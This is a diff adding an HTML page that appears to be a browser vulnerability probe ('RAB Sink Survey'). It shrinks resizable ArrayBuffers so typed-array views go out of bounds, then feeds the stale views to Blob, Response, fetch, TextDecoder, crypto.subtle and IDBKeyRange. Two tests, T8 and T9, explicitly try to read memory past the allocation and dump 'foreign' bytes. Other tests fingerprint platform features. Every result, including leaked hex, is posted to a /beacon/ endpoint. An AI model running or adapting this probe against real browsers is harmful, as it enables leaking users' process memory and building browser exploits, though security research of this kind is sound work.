@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V529</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V529 — RAB Sink Survey (Blob/TD/Response/fetch/recon)
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V529-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+
+B('BOOT',navigator.userAgent);
+
+// Helper: make OOB RAB view (resize down so view becomes OOB)
+function makeOOB(totalSize,viewOffset,viewLen,fillByte,shrinkTo){
+  var rab=new ArrayBuffer(totalSize,{maxByteLength:totalSize});
+  var v=new Uint8Array(rab,viewOffset,viewLen);
+  for(var i=0;i<viewLen;i++) v[i]=fillByte;
+  rab.resize(shrinkTo);
+  return {rab:rab,view:v};
+}
+
+// === T1: Blob constructor ===
+setTimeout(function(){
+  try{
+    B('T1-START','Blob in-bounds RAB');
+    var rab=new ArrayBuffer(256,{maxByteLength:256});
+    var rv=new Uint8Array(rab,0,256);
+    for(var i=0;i<256;i++) rv[i]=0xEE;
+    var blob=new Blob([rv]);
+    B('T1-BLOB-IN','size='+blob.size);
+    var fr=new FileReader();
+    fr.onload=function(){
+      var u=new Uint8Array(fr.result);
+      B('T1-BLOB-IN-DATA','len='+u.length+' [0]='+(u.length>0?'0x'+u[0].toString(16):'empty'));
+    };
+    fr.onerror=function(){B('T1-BLOB-IN-ERR','FileReader error')};
+    fr.readAsArrayBuffer(blob);
+  }catch(e){B('T1-ERR',''+e)}
+},500);
+
+setTimeout(function(){
+  try{
+    B('T1B-START','Blob OOB RAB');
+    var o=makeOOB(512,0,512,0xDD,64);
+    B('T1B-VIEW','js.length='+o.view.length+' js.bo='+o.view.byteOffset);
+    var blob=new Blob([o.view]);
+    B('T1B-BLOB-OOB','size='+blob.size);
+    var fr=new FileReader();
+    fr.onload=function(){
+      var u=new Uint8Array(fr.result);
+      B('T1B-DATA','len='+u.length);
+      if(u.length>0){
+        var hex=[];for(var i=0;i<Math.min(32,u.length);i++) hex.push(('0'+u[i].toString(16)).slice(-2));
+        B('T1B-HEX',hex.join(' '));
+      }
+    };
+    fr.onerror=function(){B('T1B-READ-ERR','FileReader error')};
+    fr.readAsArrayBuffer(blob);
+  }catch(e){B('T1B-ERR',''+e)}
+},2500);
+
+// === T2: TextDecoder ===
+setTimeout(function(){
+  try{
+    B('T2-START','TextDecoder in-bounds RAB');
+    var td=new TextDecoder();
+    var rab=new ArrayBuffer(32,{maxByteLength:32});
+    var rv=new Uint8Array(rab,0,32);
+    for(var i=0;i<32;i++) rv[i]=0x41;
+    var txt=td.decode(rv);
+    B('T2-TD-IN','len='+txt.length+' val="'+txt.substring(0,16)+'"');
+  }catch(e){B('T2-ERR',''+e)}
+},4500);
+
+setTimeout(function(){
+  try{
+    B('T2B-START','TextDecoder OOB RAB');
+    var td=new TextDecoder();
+    var o=makeOOB(64,0,64,0x42,8);
+    var txt=td.decode(o.view);
+    B('T2B-TD-OOB','len='+txt.length+' val="'+txt.substring(0,32)+'"');
+  }catch(e){B('T2B-ERR',''+e)}
+},6000);
+
+// === T3: Response body ===
+setTimeout(function(){
+  try{
+    B('T3-START','Response in-bounds RAB');
+    var rab=new ArrayBuffer(128,{maxByteLength:128});
+    var rv=new Uint8Array(rab,0,128);
+    for(var i=0;i<128;i++) rv[i]=0xCC;
+    var resp=new Response(rv);
+    resp.arrayBuffer().then(function(ab){
+      var u=new Uint8Array(ab);
+      B('T3-RESP-IN','len='+u.length+' [0]='+(u.length>0?'0x'+u[0].toString(16):'empty'));
+    }).catch(function(e){B('T3-RESP-IN-ERR',''+e)});
+  }catch(e){B('T3-ERR',''+e)}
+},8000);
+
+setTimeout(function(){
+  try{
+    B('T3B-START','Response OOB RAB');
+    var o=makeOOB(256,0,256,0xFF,32);
+    var resp=new Response(o.view);
+    resp.arrayBuffer().then(function(ab){
+      var u=new Uint8Array(ab);
+      B('T3B-RESP-OOB','len='+u.length+' [0]='+(u.length>0?'0x'+u[0].toString(16):'empty'));
+      if(u.length>0){
+        var hex=[];for(var i=0;i<Math.min(32,u.length);i++) hex.push(('0'+u[i].toString(16)).slice(-2));
+        B('T3B-HEX',hex.join(' '));
+      }
+    }).catch(function(e){B('T3B-RESP-OOB-ERR',''+e)});
+  }catch(e){B('T3B-ERR',''+e)}
+},10000);
+
+// === T4: fetch POST — server sees content-length ===
+setTimeout(function(){
+  try{
+    B('T4-START','fetch POST in-bounds RAB');
+    var rab=new ArrayBuffer(128,{maxByteLength:128});
+    var rv=new Uint8Array(rab,0,128);
+    for(var i=0;i<128;i++) rv[i]=0xAB;
+    fetch('/beacon/V529-T4-FETCH-IN',{method:'POST',body:rv}).then(function(r){
+      B('T4-FETCH-IN','status='+r.status);
+    }).catch(function(e){B('T4-FETCH-IN-ERR',''+e)});
+  }catch(e){B('T4-ERR',''+e)}
+},12000);
+
+setTimeout(function(){
+  try{
+    B('T4B-START','fetch POST OOB RAB');
+    var o=makeOOB(512,0,512,0xCD,64);
+    fetch('/beacon/V529-T4B-FETCH-OOB',{method:'POST',body:o.view}).then(function(r){
+      B('T4B-FETCH-OOB','status='+r.status);
+    }).catch(function(e){B('T4B-FETCH-OOB-ERR',''+e)});
+  }catch(e){B('T4B-ERR',''+e)}
+},14000);
+
+// === T5: crypto.subtle.digest with RAB ===
+setTimeout(function(){
+  try{
+    B('T5-START','crypto.subtle RAB');
+    if(!crypto||!crypto.subtle){B('T5-DEAD','no crypto.subtle');return}
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var rv=new Uint8Array(rab,0,64);
+    for(var i=0;i<64;i++) rv[i]=0xAA;
+    crypto.subtle.digest('SHA-256',rv).then(function(hash){
+      var h=new Uint8Array(hash);
+      B('T5-HASH-IN','len='+h.length);
+    }).catch(function(e){B('T5-HASH-IN-ERR',''+e)});
+
+    // OOB
+    var o=makeOOB(128,0,128,0xBB,16);
+    crypto.subtle.digest('SHA-256',o.view).then(function(hash){
+      var h=new Uint8Array(hash);
+      B('T5-HASH-OOB','len='+h.length+' (hashed stale data?)');
+    }).catch(function(e){B('T5-HASH-OOB-ERR',''+e)});
+  }catch(e){B('T5-ERR',''+e)}
+},16000);
+
+// === T6: CompressionStream with RAB ===
+setTimeout(function(){
+  try{
+    B('T6-START','CompressionStream RAB');
+    if(typeof CompressionStream==='undefined'){B('T6-DEAD','no CompressionStream');return}
+    // Create readable from OOB view
+    var o=makeOOB(256,0,256,0x41,32);
+    var blob=new Blob([o.view]);
+    var cs=new CompressionStream('gzip');
+    var compressed=blob.stream().pipeThrough(cs);
+    var reader=compressed.getReader();
+    var chunks=[];
+    function pump(){
+      return reader.read().then(function(r){
+        if(r.done){
+          var total=0;chunks.forEach(function(c){total+=c.length});
+          B('T6-COMP','compressed_size='+total+' (from OOB blob)');
+          return;
+        }
+        chunks.push(r.value);
+        return pump();
+      });
+    }
+    pump().catch(function(e){B('T6-COMP-ERR',''+e)});
+  }catch(e){B('T6-ERR',''+e)}
+},18000);
+
+// === T7: Platform recon ===
+setTimeout(function(){
+  try{
+    B('T7-START','platform recon');
+    B('T7-MSE','MediaSource='+(typeof MediaSource));
+    B('T7-MSIE','ManagedMediaSource='+(typeof ManagedMediaSource));
+    B('T7-SRCBUF','SourceBuffer='+(typeof SourceBuffer));
+    B('T7-IDB','indexedDB='+(typeof indexedDB));
+    B('T7-WS','WebSocket='+(typeof WebSocket));
+    B('T7-RTC','RTCPeerConnection='+(typeof RTCPeerConnection));
+    B('T7-RTCDC','RTCDataChannel='+(typeof RTCDataChannel));
+    B('T7-PERF','performance.now='+performance.now());
+    B('T7-CRYPTO','crypto.subtle='+(crypto&&crypto.subtle?'yes':'no'));
+    B('T7-COMP','CompressionStream='+(typeof CompressionStream));
+    B('T7-DECOMP','DecompressionStream='+(typeof DecompressionStream));
+    B('T7-LOCK','navigator.locks='+(navigator.locks?'yes':'no'));
+    B('T7-CACHE','caches='+(typeof caches));
+    B('T7-SW','serviceWorker='+(navigator.serviceWorker?'yes':'no'));
+    B('T7-INTL','Intl.Segmenter='+(typeof Intl!=='undefined'&&Intl.Segmenter?'function':'no'));
+    B('T7-STRUCT','structuredClone='+(typeof structuredClone));
+    B('T7-ABTFR','ArrayBuffer.prototype.transfer='+(typeof ArrayBuffer.prototype.transfer));
+    B('T7-FINREG','FinalizationRegistry='+(typeof FinalizationRegistry));
+    B('T7-WEAKREF','WeakRef='+(typeof WeakRef));
+    B('T7-OFFCV','OffscreenCanvas='+(typeof OffscreenCanvas));
+    B('T7-TSTREAM','TransformStream='+(typeof TransformStream));
+    B('T7-RSTREAM','ReadableStream='+(typeof ReadableStream));
+    B('T7-WSTREAM','WritableStream='+(typeof WritableStream));
+    B('T7-DONE','ok');
+  }catch(e){B('T7-ERR',''+e)}
+},20000);
+
+// === T8: IDB OOB with offset (view starts mid-buffer, becomes OOB) ===
+setTimeout(function(){
+  try{
+    B('T8-START','IDB OOB with offset');
+    var rab=new ArrayBuffer(0x2000,{maxByteLength:0x2000});
+    // Fill entire buffer with pattern
+    var full=new Uint8Array(rab);
+    for(var i=0;i<0x2000;i++) full[i]=(i&0xFF);
+    // View at offset 0x1800, length 0x800
+    var v=new Uint8Array(rab,0x1800,0x800);
+    B('T8-PRE','view.length='+v.length+' view.bo='+v.byteOffset);
+    // Resize to 0x1000 — view at 0x1800 is OOB
+    rab.resize(0x1000);
+    B('T8-POST','view.length='+v.length+' view.bo='+v.byteOffset+' buf.bl='+rab.byteLength);
+    // C++ should see stale byteOffset=0x1800 and stale byteLength=0x800
+    // Copy starts at data()+0x1800, copies 0x800 bytes
+    // But buffer was resized to 0x1000 — reading PAST the new end
+    // If decommitted pages: crash. If still mapped: reads old data
+    var key=IDBKeyRange.only(v);
+    if(key.lower instanceof ArrayBuffer){
+      var r=new Uint8Array(key.lower);
+      B('T8-RESULT','len='+r.length);
+      if(r.length>0){
+        var hex=[];for(var i=0;i<Math.min(32,r.length);i++) hex.push(('0'+r[i].toString(16)).slice(-2));
+        B('T8-HEX',hex.join(' '));
+        // Check if data matches our pattern (0x1800+i)&0xFF
+        var match=0;
+        for(var i=0;i<r.length;i++){
+          if(r[i]===((0x1800+i)&0xFF)) match++;
+        }
+        B('T8-MATCH',match+'/'+r.length+' pattern bytes');
+        // Non-pattern bytes = memory from beyond original fill
+        var foreign=r.length-match;
+        B('T8-FOREIGN',foreign+' non-pattern bytes');
+      }
+    }
+  }catch(e){B('T8-ERR',''+e)}
+},22000);
+
+// === T9: Large OOB — read past allocation boundary ===
+setTimeout(function(){
+  try{
+    B('T9-START','large OOB cross-boundary');
+    // Allocate small, create large view, resize to minimum
+    var rab=new ArrayBuffer(0x10000,{maxByteLength:0x10000});
+    var fill=new Uint8Array(rab);
+    for(var i=0;i<0x10000;i++) fill[i]=0xAA;
+    // View covers entire buffer
+    var v=new Uint8Array(rab,0,0x10000);
+    // Resize to 4KB — view is OOB by 60KB
+    rab.resize(0x1000);
+    B('T9-RESIZED','buf.bl='+rab.byteLength+' view stale len=65536');
+    // This reads 64KB starting from data() — first 4KB is ours, rest is ?
+    var key=IDBKeyRange.only(v);
+    if(key.lower instanceof ArrayBuffer){
+      var r=new Uint8Array(key.lower);
+      B('T9-RESULT','len='+r.length);
+      // Check first 4KB (should be 0xAA — in current allocation)
+      var aaCount=0;
+      for(var i=0;i<Math.min(0x1000,r.length);i++) if(r[i]===0xAA) aaCount++;
+      B('T9-INBOUNDS','first4k AA='+aaCount+'/4096');
+      // Check bytes PAST 4KB — these are outside the resized allocation
+      if(r.length>0x1000){
+        var pastCount=r.length-0x1000;
+        var nonAA=0;var nonZero=0;
+        for(var i=0x1000;i<r.length;i++){
+          if(r[i]!==0xAA) nonAA++;
+          if(r[i]!==0) nonZero++;
+        }
+        B('T9-PAST','pastBytes='+pastCount+' nonAA='+nonAA+' nonZero='+nonZero);
+        // Dump bytes right at boundary
+        var hex=[];for(var i=0xFFC;i<Math.min(0x1010,r.length);i++) hex.push(('0'+r[i].toString(16)).slice(-2));
+        B('T9-BOUNDARY',hex.join(' '));
+      }
+    }
+  }catch(e){B('T9-ERR',''+e)}
+},25000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},28000);
+</script></body></html>
